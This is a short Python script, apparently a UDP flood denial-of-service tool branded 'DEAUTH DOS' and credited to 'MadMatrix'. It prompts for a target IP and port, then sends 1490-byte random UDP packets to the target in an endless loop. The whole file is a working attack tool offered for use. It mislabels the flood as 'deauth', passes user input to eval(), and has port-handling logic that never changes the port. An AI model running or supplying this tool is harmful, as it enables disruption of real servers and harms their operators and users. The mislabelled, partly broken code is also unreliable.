import sys
import os
import time
import socket
import random
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

print('''
 (                                     )   (         )   (    
 )\ )         (              *   )  ( /(   )\ )   ( /(   )\ ) 
(()/(   (     )\        (  ` )  /(  )\()) (()/(   )\()) (()/( 
 /(_))  )\ ((((_)(      )\  ( )(_))((_)\   /(_)) ((_)\   /(_))
(_))_  ((_) )\ _ )\  _ ((_)(_(_())  _((_) (_))_    ((_) (_))  
 |   \ | __|(_)_\(_)| | | ||_   _| | || |  |   \  / _ \ / __| 
 | |) || _|  / _ \  | |_| |  | |   | __ |  | |) || (_) |\__ \ 
 |___/ |___|/_/ \_\  \___/   |_|   |_||_|  |___/  \___/ |___/  made by MadMatrix

''')

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

ip = input("[+] ENTER TARGET IP: ")
port = eval(input("[+] PORT: "))

try:
    validate = URLValidator()

    validate(ip)
    print("[+] LOADING...")
except ValidationError as exception:
    print("[+] DEAUTH DOS STARTING...")

print("[+] DEAUTH DOS ATTACK STARTING ON SERVER: " + ip)
print("")

time.sleep(5)
sent = 0

try:
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        print("\n [+] SENT %s DEAUTH %s THROUGH PORT: %s" % (sent, ip, port))
        if port == 65534:
            port = 1
except KeyboardInterrupt:
    print("\n[-] CTRL-C Detected... DOS ATTACK STOPPED")

input("Press Enter to exit...")
print("DEAUTH DOS :(")



